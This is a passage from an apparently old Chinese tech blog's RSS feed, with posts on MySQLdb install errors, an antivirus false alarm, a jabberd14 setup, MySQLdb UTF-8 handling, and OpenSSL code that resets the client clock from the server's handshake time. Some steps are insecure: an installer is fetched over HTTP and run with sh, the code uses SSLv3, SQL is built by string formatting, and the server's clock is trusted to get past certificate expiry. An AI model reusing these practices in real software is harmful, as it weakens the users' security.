<span style="background-color: #373b41;"> </span> python setup.py install
</pre>
</div>
</div>
</div>

<div id="outline-container-sec-2" class="outline-2">
<h2 id="sec-2">常见错误及其修复</h2>
<div class="outline-text-2" id="text-2">
<ul class="org-ul">
<li>ImportError: No module named setuptools
<div class="org-src-container">

<pre class="src src-sh" id="install-setuptools">wget http://pypi.python.org/packages/2.4/s/setuptools/setuptools-0.6c11-py2.4.eg<span style="text-decoration: underline;">g</span><span style="color: #8abeb7; text-decoration: underline;">\</span>
<span style="color: #969896; font-style: italic;">#</span><span style="color: #969896; font-style: italic;">md5=bd639f9b0eac4c42497034dec2ec0c2b</span>
sh setuptools-0.6c11-py2.4.egg
</pre>
</div>
</li>

<li>mysql_config: command not found
<div class="org-src-container">

<pre class="src src-sh" id="edit-site.cfg">sed --in-place -e <span style="color: #8abeb7;">"s/#mysql_config = \/usr\/local\/bin\/mysql_config/\</span>
<span style="color: #8abeb7;">mysql_config = \/usr\/local\/mysql\/bin\/mysql_config/g"</span> site.cfg
</pre>
</div>
</li>

<li>ImportError: &hellip; _mysql.so: undefined symbol: compress
<div class="org-src-container">

<pre class="src src-sh" id="edit-setup_posix.py">sed --in-place -e <span style="color: #8abeb7;">"s/libs = mysql_config(\"libs_r\")/libs = mysql_config(\"libs_</span><span style="color: #8abeb7; text-decoration: underline;">r\")\n\</span>
<span style="color: #8abeb7;">libs.append('-lz')\n        print libs/g"</span> setup_posix.py
</pre>
</div>
</li>
</ul>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[解决360杀毒报网页HTML.Rce.Gen3恶意程序的问题]]></title>
            <link>/article/89e351b3-360-67406bd262a57f519875-html.rce.gen3-6076610f7a0b5e8f768495ee9898.html</link>
            <guid>/article/89e351b3-360-67406bd262a57f519875-html.rce.gen3-6076610f7a0b5e8f768495ee9898.html</guid>
            <pubDate>Wed, 01 Aug 2012 00:55:00 GMT</pubDate>
            <content:encoded><![CDATA[
<div id="outline-container-sec-1" class="outline-2">
<h2 id="sec-1">问题描述</h2>
<div class="outline-text-2" id="text-1">
<p>
测试发现在某些机器上会弹出360杀毒危险警告对话框，导致网页无法打开。
</p>
</div>
</div>

<div id="outline-container-sec-2" class="outline-2">
<h2 id="sec-2">解决方法</h2>
<div class="outline-text-2" id="text-2">
<p>
将嵌入的统计js脚本从&lt;/html&gt;标签后移到里面去。
</p>
<ul class="org-ul">
<li>修改前
</li>
</ul>
<div class="org-src-container">

<pre class="src src-html">...
&lt;/<span style="color: #de935f;">body</span>&gt;
&lt;/<span style="color: #de935f;">html</span>&gt;
&lt;<span style="color: #de935f;">script</span> <span style="color: #f0c674;">type</span>=<span style="color: #8abeb7;">"text/javascript"</span>&gt;document.write(unescape(<span style="color: #8abeb7;">"%3Cscript%20...%3C/script%3E"</span>));&lt;/<span style="color: #de935f;">script</span>&gt;
</pre>
</div>
<ul class="org-ul">
<li>修改后
</li>
</ul>
<div class="org-src-container">

<pre class="src src-html">...
&lt;<span style="color: #de935f;">script</span> <span style="color: #f0c674;">type</span>=<span style="color: #8abeb7;">"text/javascript"</span>&gt;document.write(unescape(<span style="color: #8abeb7;">"%3Cscript%20...%3C/script%3E"</span>));&lt;/<span style="color: #de935f;">script</span>&gt;
&lt;/<span style="color: #de935f;">body</span>&gt;
&lt;/<span style="color: #de935f;">html</span>&gt;
</pre>
</div>
</div>
</div>

<div id="outline-container-sec-3" class="outline-2">
<h2 id="sec-3">心得</h2>
<div class="outline-text-2" id="text-3">
<p>
以后再遇到这种情况，可以采取排除法，将网页另存为本地文件，一点点的删除内容直到360杀毒不再报警为止。</p>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[搭建jabber服务器]]></title>
            <link>/article/642d5efa-jabber-670d52a15668.html</link>
            <guid>/article/642d5efa-jabber-670d52a15668.html</guid>
            <pubDate>Tue, 03 May 2011 16:32:00 GMT</pubDate>
            <content:encoded><![CDATA[<ul class="org-ul">
<li>编译安装

<p>
<code>下载</code>
</p>
<div class="org-src-container">

<pre class="src src-sh">wget http://download.jabberd.org/jabberd14/jabberd14-1.6.1.1.tar.gz
tar xzvf jabberd14-1.6.1.1.tar.gz
<span style="color: #b294bb;">cd</span> jabberd14-1.6.1.1
</pre>
</div>

<p>
<code>修改代码以解决编译错误</code>
</p>
<div class="org-src-container">

<pre class="src src-sh">diff -r jabberd14-1.6.1.1/jabberd/lib/xmlnode.cc tmp/jabberd14-1.6.1.1/jabberd/l<span style="text-decoration: underline;">ib/xmlnode.cc</span>
882,884c882,884
&lt;     const char *next_step = NULL;
&lt;     const char *start_predicate = NULL;
&lt;     const char *end_predicate = NULL;
---
&gt;     char *next_step = NULL;
&gt;     char *start_predicate = NULL;
&gt;     char *end_predicate = NULL;
1836c1836
&lt;         ((char*)strchr(lang, <span style="color: #8abeb7;">'-'</span>))[0] = 0;
---
&gt;         strchr(lang, <span style="color: #8abeb7;">'-'</span>)[0] = 0;
diff -r jabberd14-1.6.1.1/jabberd/log.cc tmp/jabberd14-1.6.1.1/jabberd/log.cc
89c89
&lt;         pos = (char*)strchr(zone,<span style="color: #8abeb7;">'.'</span>);
---
&gt;     pos = strchr(zone,<span style="color: #8abeb7;">'.'</span>);
diff -r jabberd14-1.6.1.1/jabberd/mio_tls.cc tmp/jabberd14-1.6.1.1/jabberd/mio_t<span style="text-decoration: underline;">ls.cc</span>
615c615
&lt;         ret = gnutls_certificate_set_openpgp_key_file(current_credentials, pub<span style="text-decoration: underline;">file, privfile, GNUTLS_OPENPGP_FMT_BASE64);</span>
---
&gt;         ret = gnutls_certificate_set_openpgp_key_file(current_credentials, pub<span style="text-decoration: underline;">file, privfile);</span>
634c634
&lt;         ret = gnutls_certificate_set_openpgp_keyring_file(current_credentials,<span style="text-decoration: underline;"> file, GNUTLS_OPENPGP_FMT_BASE64);</span>
---
&gt;         ret = gnutls_certificate_set_openpgp_keyring_file(current_credentials,<span style="text-decoration: underline;"> file);</span>
640a641,657
&gt;     }
&gt;
&gt;     // load GnuPG trustdb
&gt;     if (j_strcmp(xmlnode_get_localname(cur), <span style="color: #8abeb7;">"trustdb"</span>) == 0) {
&gt;         char const *const file = xmlnode_get_data(cur);
&gt;
&gt;         if (file == NULL) {
&gt;         log_warn(NULL, <span style="color: #8abeb7;">"Initializing TLS subsystem: &lt;trustdb/&gt; element inside </span><span style="color: #8abeb7; text-decoration: underline;">the TLS configuration, that does not contain a file-name."</span><span style="text-decoration: underline;">);</span>
&gt;         continue;
&gt;         }
&gt;
&gt;         // load the GnuPG trustdb
&gt;         ret = gnutls_certificate_set_openpgp_trustdb(current_credentials, file<span style="text-decoration: underline;">);</span>
&gt;         if (ret &lt; 0) {
&gt;         log_error(NULL, <span style="color: #8abeb7;">"Error loading GnuPG trustdb %s: %s"</span>, file, gnutls_str<span style="text-decoration: underline;">error(ret));</span>
&gt;         continue;
&gt;         }
</pre>
</div>

<p>
<code>编译安装</code>
</p>
<div class="org-src-container">

<pre class="src src-sh">./configure &amp;&amp; make &amp;&amp; sudo make install
</pre>
</div>

<p>
如出错通常是少了相关依赖库，用包管理工具（如：ubuntu下的新立得）安装即可。
</p>
</li>

<li>配置

<p>
按照mysql.sql中的注释配置数据库：
</p>

<div class="org-src-container">

<pre class="src src-sh">mysql -uroot -p
mysql&gt; CREATE DATABASE jabber CHARACTER SET utf8;
mysql&gt; use jabber;
mysql&gt; grant all on jabber.* to jabber@localhost identified by <span style="color: #8abeb7;">'secret'</span>;
mysql&gt; <span style="color: #8abeb7;">\.</span> mysql.sql
</pre>
</div>
</li>

<li>运行

<div class="org-src-container">

<pre class="src src-sh">sudo jabberd -h localhost -B
</pre>
</div>
</li>

<li>注册用户1

<div class="org-src-container">

<pre class="src src-sh">telnet localhost 5222
&lt;stream:stream
<span style="background-color: #373b41;"> </span> <span style="color: #f0c674;">to</span>=<span style="color: #8abeb7;">'localhost'</span>
<span style="background-color: #373b41;"> </span> <span style="color: #f0c674;">xmlns</span>=<span style="color: #8abeb7;">'jabber:client'</span>
<span style="background-color: #373b41;"> </span> xmlns:<span style="color: #f0c674;">stream</span>=<span style="color: #8abeb7;">'http://etherx.jabber.org/streams'</span>&gt;

&lt;iq <span style="color: #f0c674;">id</span>=<span style="color: #8abeb7;">'reg1'</span> <span style="color: #f0c674;">type</span>=<span style="color: #8abeb7;">'set'</span>&gt;
<span style="background-color: #373b41;"> </span> &lt;query <span style="color: #f0c674;">xmlns</span>=<span style="color: #8abeb7;">'jabber:iq:register'</span>&gt;
<span style="background-color: #373b41;"> </span>   &lt;username&gt;jack&lt;/username&gt;
<span style="background-color: #373b41;"> </span>   &lt;password&gt;jack&lt;/password&gt;
<span style="background-color: #373b41;"> </span>   &lt;name&gt;jack&lt;/name&gt;
<span style="background-color: #373b41;"> </span>   &lt;email&gt;&lt;/email&gt;
<span style="background-color: #373b41;"> </span> &lt;/query&gt;
&lt;/iq&gt;

&lt;/stream:stream&gt;
</pre>
</div>
</li>

<li>登录用户1

<pre class="example">
Empathy菜单-&gt;编辑-&gt;帐户-&gt;添加：
协议: Jabber
登录ID: jack@localhost
记住密码
密码: jack
登录
</pre>
</li>

<li>注册用户2

<div class="org-src-container">

<pre class="src src-sh">telnet localhost 5222
&lt;stream:stream
<span style="background-color: #373b41;"> </span> <span style="color: #f0c674;">to</span>=<span style="color: #8abeb7;">'localhost'</span>
<span style="background-color: #373b41;"> </span> <span style="color: #f0c674;">xmlns</span>=<span style="color: #8abeb7;">'jabber:client'</span>
<span style="background-color: #373b41;"> </span> xmlns:<span style="color: #f0c674;">stream</span>=<span style="color: #8abeb7;">'http://etherx.jabber.org/streams'</span>&gt;

&lt;iq <span style="color: #f0c674;">id</span>=<span style="color: #8abeb7;">'reg1'</span> <span style="color: #f0c674;">type</span>=<span style="color: #8abeb7;">'set'</span>&gt;
<span style="background-color: #373b41;"> </span> &lt;query <span style="color: #f0c674;">xmlns</span>=<span style="color: #8abeb7;">'jabber:iq:register'</span>&gt;
<span style="background-color: #373b41;"> </span>   &lt;username&gt;rose&lt;/username&gt;
<span style="background-color: #373b41;"> </span>   &lt;password&gt;rose&lt;/password&gt;
<span style="background-color: #373b41;"> </span>   &lt;name&gt;rose&lt;/name&gt;
<span style="background-color: #373b41;"> </span>   &lt;email&gt;&lt;/email&gt;
<span style="background-color: #373b41;"> </span> &lt;/query&gt;
&lt;/iq&gt;

&lt;/stream:stream&gt;
</pre>
</div>
</li>

<li>用户1加用户2为联系人

<pre class="example">
Empathy菜单-&gt;聊天-&gt;添加联系人:
帐户：jack@localhost
标识符: rose@localhost
添加
</pre>
</li>

<li>登录用户2，并发一个消息给用户1

<div class="org-src-container">

<pre class="src src-sh">telnet localhost 5222
&lt;stream:stream
<span style="background-color: #373b41;"> </span> <span style="color: #f0c674;">to</span>=<span style="color: #8abeb7;">'localhost'</span>
<span style="background-color: #373b41;"> </span> <span style="color: #f0c674;">xmlns</span>=<span style="color: #8abeb7;">'jabber:client'</span>
<span style="background-color: #373b41;"> </span> xmlns:<span style="color: #f0c674;">stream</span>=<span style="color: #8abeb7;">'http://etherx.jabber.org/streams'</span>&gt;

&lt;iq <span style="color: #f0c674;">id</span>=<span style="color: #8abeb7;">'auth1'</span> <span style="color: #f0c674;">type</span>=<span style="color: #8abeb7;">'set'</span>&gt;
<span style="background-color: #373b41;"> </span> &lt;query <span style="color: #f0c674;">xmlns</span>=<span style="color: #8abeb7;">'jabber:iq:auth'</span>&gt;
<span style="background-color: #373b41;"> </span>   &lt;username&gt;rose&lt;/username&gt;
<span style="background-color: #373b41;"> </span>   &lt;password&gt;rose&lt;/password&gt;
<span style="background-color: #373b41;"> </span>   &lt;resource&gt;test&lt;/resource&gt;
<span style="background-color: #373b41;"> </span> &lt;/query&gt;
&lt;/iq&gt;

&lt;presence/&gt;

&lt;message <span style="color: #f0c674;">to</span>=<span style="color: #8abeb7;">'jack@localhost'</span>&gt;
<span style="background-color: #373b41;"> </span> &lt;body&gt;hello, jack&lt;/body&gt;
&lt;/message&gt;

&lt;/stream:stream&gt;
</pre>
</div>
</li>
</ul>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[python中MySQLdb使用utf-8字符集]]></title>
            <link>/article/python-4e2d-mysqldb-4f7f7528-utf-8-5b577b2696c6.html</link>
            <guid>/article/python-4e2d-mysqldb-4f7f7528-utf-8-5b577b2696c6.html</guid>
            <pubDate>Thu, 28 Apr 2011 17:22:00 GMT</pubDate>
            <content:encoded><![CDATA[<dl class="org-dl">
<dt> 要避免乱码需要做好以下几点 </dt><dd><ul class="org-ul">
<li>python源代码保存为utf-8
</li>
<li>数据库建成utf-8
</li>
<li>mysql连接设置为utf-8
</li>
<li>查询結果中的文本字段是unicode的，转回utf-8
</li>
</ul>
</dd>

<dt> 总结性的示例代码 </dt><dd><div class="org-src-container">

<pre class="src src-python"><span style="color: #969896; font-style: italic;">#</span><span style="color: #969896; font-style: italic;">!/usr/bin/env python</span>
<span style="color: #969896; font-style: italic;">#</span><span style="color: #969896; font-style: italic;">-*- coding: utf-8 -*-</span>

<span style="color: #b5bd68;">import</span> MySQLdb

<span style="color: #b5bd68;">if</span> <span style="color: #b294bb;">__name__</span> == <span style="color: #8abeb7;">'__main__'</span>:
<span style="background-color: #373b41;"> </span>   <span style="color: #f0c674;">mysql</span> = MySQLdb.connect(host=<span style="color: #8abeb7;">'localhost'</span>, user=<span style="color: #8abeb7;">'root'</span>, passwd=<span style="color: #8abeb7;">'123456'</span>, char<span style="text-decoration: underline;">set=</span><span style="color: #8abeb7; text-decoration: underline;">'utf8'</span><span style="text-decoration: underline;">)</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #f0c674;">cursor</span> = mysql.cursor()
<span style="background-color: #373b41;"> </span>   cursor.execute(<span style="color: #8abeb7;">'SET NAMES UTF8'</span>)
<span style="background-color: #373b41;"> </span>   <span style="color: #f0c674;">sql</span> = <span style="color: #8abeb7;">'DROP DATABASE IF EXISTS mysqldb_utf8_test'</span>
<span style="background-color: #373b41;"> </span>   cursor.execute(sql)
<span style="background-color: #373b41;"> </span>   <span style="color: #f0c674;">sql</span> = <span style="color: #8abeb7;">'CREATE DATABASE mysqldb_utf8_test DEFAULT CHARACTER SET utf8 COLLATE </span><span style="color: #8abeb7; text-decoration: underline;">utf8_general_ci'</span>
<span style="background-color: #373b41;"> </span>   cursor.execute(sql)
<span style="background-color: #373b41;"> </span>   <span style="color: #f0c674;">mysql</span> = MySQLdb.connect(host=<span style="color: #8abeb7;">'localhost'</span>, user=<span style="color: #8abeb7;">'root'</span>, passwd=<span style="color: #8abeb7;">'123456'</span>, db=<span style="color: #8abeb7;">'</span><span style="color: #8abeb7; text-decoration: underline;">mysqldb_utf8_test'</span><span style="text-decoration: underline;">, charset=</span><span style="color: #8abeb7; text-decoration: underline;">'utf8'</span><span style="text-decoration: underline;">)</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #f0c674;">cursor</span> = mysql.cursor()
<span style="background-color: #373b41;"> </span>   cursor.execute(<span style="color: #8abeb7;">'SET NAMES UTF8'</span>)
<span style="background-color: #373b41;"> </span>   <span style="color: #f0c674;">sql</span> = <span style="color: #8abeb7;">'CREATE TABLE utf8_table(key_field VARCHAR(32) NOT NULL, value_field V</span><span style="color: #8abeb7; text-decoration: underline;">ARCHAR(255) NOT NULL)'</span>
<span style="background-color: #373b41;"> </span>   cursor.execute(sql)
<span style="background-color: #373b41;"> </span>   <span style="color: #f0c674;">key</span> = <span style="color: #8abeb7;">'tangxinfa'</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #f0c674;">value</span> = <span style="color: #8abeb7;">'&#22909;&#20154;&#19968;&#20010;'</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #f0c674;">sql</span> = <span style="color: #8abeb7;">'INSERT INTO utf8_table VALUES("%s", "%s")'</span>%(key, value)
<span style="background-color: #373b41;"> </span>   cursor.execute(sql)       <span style="color: #969896; font-style: italic;">#</span><span style="color: #969896; font-style: italic;">&#27880;&#24847;&#26576;&#20123;&#26087;&#29256;&#26412;&#30340;mysql&#65288;&#22914;4.1.22&#20197;&#19979;&#65289;&#65292;mysql.character_set_name</span><span style="color: #969896; font-style: italic; text-decoration: underline;">()&#24635;&#26159;&#36820;&#22238;latin1&#65292;&#20250;&#24341;&#36215;&#20081;&#30721;&#65292;&#38656;&#35201;&#25913;&#20026;cursor.execute('INSERT INTO utf8_table VALUES("%s", "%s")', (key, value))</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #f0c674;">sql</span> = <span style="color: #8abeb7;">'select * from utf8_table'</span>
<span style="background-color: #373b41;"> </span>   cursor.execute(sql)
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">for</span> record <span style="color: #b5bd68;">in</span> cursor.fetchall():
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">for</span> item <span style="color: #b5bd68;">in</span> record:
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">print</span> item.encode(<span style="color: #8abeb7;">'utf8'</span>)
</pre>
</div>
</dd>

<dt> 参考 </dt><dd><ul class="org-ul">
<li><a href="http://mysql-python.sourceforge.net/MySQLdb.html">http://mysql-python.sourceforge.net/MySQLdb.html</a>
</li>
<li><a href="http://bbs.phpchina.com/viewthread.php?tid=13861">http://bbs.phpchina.com/viewthread.php?tid=13861</a>
</li>
<li><a href="http://hi.baidu.com/ak456/blog/item/c318502394aa20569922ed7b.html">http://hi.baidu.com/ak456/blog/item/c318502394aa20569922ed7b.html</a>
</li>
</ul>
</dd>
</dl>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[SSL双方系统时间不一致导致的SSL连接失败及其解决方案]]></title>
            <link>/article/ssl-53cc65b97cfb7edf65f695f44e0d4e0081f45bfc81f47684-ssl-8fde63a559318d2553ca517689e351b365b96848.html</link>
            <guid>/article/ssl-53cc65b97cfb7edf65f695f44e0d4e0081f45bfc81f47684-ssl-8fde63a559318d2553ca517689e351b365b96848.html</guid>
            <pubDate>Fri, 25 Jul 2008 09:45:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
在产品使用中，实施人员常常报告服务器与客户端无法连接，最终查明原因是双方的时间设置不一致。OpenSSL证书有一个有效时间段，当客户端或服务器的系统时间不在这个时间段内时SSL会因证书验证失败而无法连接。在实施中系统时间错误是很常见的，因不能上网而未开时间自动同步、bios没电了、客户疏忽等原因都会导致系统时间设置错误。如果连接失败后再查看系统时间设置进行故障排查终归是一件麻烦的事情。
</p>

<p>
解决这个问题有以下几个办法：
</p>

<ul class="org-ul">
<li>将证书的有效期设置得够大（如：1970-2099）

<p>
这样估计可以在一定程度上解决这个问题，不过这也是个馊主意，一般申请的证书总会有一个合理的有效期。
</p>
</li>

<li>检测及必要时自动同步客户端与服务器的时间

<p>
通过用wireshake抓包分析SSL建立连接的过程，发现在SSL握手过程中，会向对方传送本机的系统时间。因此一个显而易见的办法就是，当连接过程中检测到证书过期，将客户端的时间同步为服务器端的时间，再重连即可。
</p>

<p>
下面是具体的示例代码：
</p>
<div class="org-src-container">

<pre class="src src-c"><span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;openssl/ssl.h&gt;</span>
<span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;openssl/bio.h&gt;</span>
<span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;openssl/err.h&gt;</span>
<span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;winsock2.h&gt;</span>
<span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;stdio.h&gt;</span>
<span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;string.h&gt;</span>
<span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;time.h&gt;</span>

<span style="color: #b5bd68;">typedef</span> <span style="color: #b5bd68;">struct</span> <span style="color: #81a2be;">_TimeInfo</span>
{
<span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">time_t</span> <span style="color: #f0c674;">client</span>;  <span style="color: #969896; font-style: italic;">/*</span><span style="color: #969896; font-style: italic;">&#23458;&#25143;&#31471;&#30340;&#26102;&#38388;</span><span style="color: #969896; font-style: italic;">*/</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">time_t</span> <span style="color: #f0c674;">server</span>;  <span style="color: #969896; font-style: italic;">/*</span><span style="color: #969896; font-style: italic;">&#26381;&#21153;&#22120;&#30340;&#26102;&#38388;</span><span style="color: #969896; font-style: italic;">*/</span>
} <span style="color: #81a2be;">TimeInfo</span>;

<span style="color: #b294bb;">/**</span>
<span style="color: #b294bb; background-color: #373b41;"> </span><span style="color: #b294bb;">* &#21516;&#27493;&#31995;&#32479;&#26102;&#38388;.</span>
<span style="color: #b294bb; background-color: #373b41;"> </span><span style="color: #b294bb;">*/</span>
<span style="color: #81a2be;">BOOL</span> <span style="color: #de935f;">syncSystemTime</span>(<span style="color: #81a2be;">time_t</span> <span style="color: #f0c674;">t</span>)
{
<span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">SYSTEMTIME</span> <span style="color: #f0c674;">st</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">FILETIME</span>   <span style="color: #f0c674;">ft</span>;<span style="color: #cc6666; background-color: #373b41;">  </span>
<span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">LONGLONG</span>   <span style="color: #f0c674;">ll</span>;<span style="color: #cc6666; background-color: #373b41;">  </span>

<span style="background-color: #373b41;"> </span>   ll = Int32x32To64(t, 10000000) + 116444736000000000; <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">1970.01.01</span><span style="color: #cc6666; background-color: #373b41;">  </span>

<span style="background-color: #373b41;"> </span>   ft.dwLowDateTime  = (<span style="color: #81a2be;">DWORD</span>)ll;<span style="color: #cc6666; background-color: #373b41;">  </span>
<span style="background-color: #373b41;"> </span>   ft.dwHighDateTime = (<span style="color: #81a2be;">DWORD</span>)(ll &gt;&gt; 32);<span style="color: #cc6666; background-color: #373b41;">  </span>

<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> FileTimeToSystemTime(&amp;ft, &amp;st) &amp;&amp; SetSystemTime(&amp;st);
}

<span style="color: #b294bb;">/**</span>
<span style="color: #b294bb; background-color: #373b41;"> </span><span style="color: #b294bb;">* &#33719;&#21462;SSL&#25569;&#25163;&#36807;&#31243;&#20013;&#26381;&#21153;&#22120;&#19982;&#23458;&#25143;&#31471;&#21452;&#26041;&#30340;&#31995;&#32479;&#26102;&#38388;.</span>
<span style="color: #b294bb; background-color: #373b41;"> </span><span style="color: #b294bb;">*/</span>
<span style="color: #81a2be;">void</span> <span style="color: #de935f;">getSSLHandleShakeTimeInfo</span>(<span style="color: #81a2be;">int</span> <span style="color: #f0c674;">write_p</span>,
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>  <span style="color: #81a2be;">int</span> <span style="color: #f0c674;">version</span>,
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>  <span style="color: #81a2be;">int</span> <span style="color: #f0c674;">content_type</span>,
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>  <span style="color: #b5bd68;">const</span> <span style="color: #81a2be;">unsigned</span> <span style="color: #81a2be;">char</span>* <span style="color: #f0c674;">buf</span>,
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>  <span style="color: #81a2be;">size_t</span> <span style="color: #f0c674;">len</span>,
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>  <span style="color: #81a2be;">SSL</span> *<span style="color: #f0c674;">ssl</span>,
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>  <span style="color: #81a2be;">TimeInfo</span> *<span style="color: #f0c674;">ti</span>)
{
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(content_type != 22)   <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">require handshake message</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(len &lt; 42)
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(buf[0] == 1)          <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">ClientHello Message send from client to server</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   ti-&gt;client = htonl(*((<span style="color: #81a2be;">u_long</span>*)(buf + 6)));
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">else</span> <span style="color: #b5bd68;">if</span>(buf[0] == 2)     <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">ServerHello Message send from server to client</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   ti-&gt;server = htonl(*((<span style="color: #81a2be;">u_long</span>*)(buf + 6)));
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">else</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span>;
}

<span style="color: #81a2be;">int</span> <span style="color: #de935f;">main</span>()
{
<span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">BIO</span> * <span style="color: #f0c674;">bio</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">SSL</span> * <span style="color: #f0c674;">ssl</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">SSL_CTX</span> * <span style="color: #f0c674;">ctx</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">TimeInfo</span> <span style="color: #f0c674;">timeInfo</span> = {-1, -1};
<span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">BOOL</span> <span style="color: #f0c674;">timeSynced</span> = FALSE;
<span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">long</span> <span style="color: #f0c674;">result</span>;

<span style="background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">/* </span><span style="color: #969896; font-style: italic;">Set up the library </span><span style="color: #969896; font-style: italic;">*/</span>
<span style="background-color: #373b41;"> </span>   SSL_library_init();
<span style="background-color: #373b41;"> </span>   ERR_load_BIO_strings();
<span style="background-color: #373b41;"> </span>   SSL_load_error_strings();

<span style="background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">/* </span><span style="color: #969896; font-style: italic;">Set up the SSL context </span><span style="color: #969896; font-style: italic;">*/</span>
<span style="background-color: #373b41;"> </span>   ctx = SSL_CTX_new(SSLv3_client_method());
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(ctx == <span style="color: #81a2be;">NULL</span>)
<span style="background-color: #373b41;"> </span>   {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   fprintf(stderr, <span style="color: #8abeb7;">"Error new SSL_CTX\n"</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   ERR_print_errors_fp(stderr);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   SSL_CTX_free(ctx);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> 0;
<span style="background-color: #373b41;"> </span>   }

<span style="background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">/* </span><span style="color: #969896; font-style: italic;">Get Server and Client system time via SSL Handshake </span><span style="color: #969896; font-style: italic;">*/</span>
<span style="background-color: #373b41;"> </span>   SSL_CTX_set_msg_callback(ctx, getSSLHandleShakeTimeInfo);
<span style="background-color: #373b41;"> </span>   SSL_CTX_set_msg_callback_arg(ctx, &amp;timeInfo);

<span style="background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">/* </span><span style="color: #969896; font-style: italic;">Load the trust store </span><span style="color: #969896; font-style: italic;">*/</span>
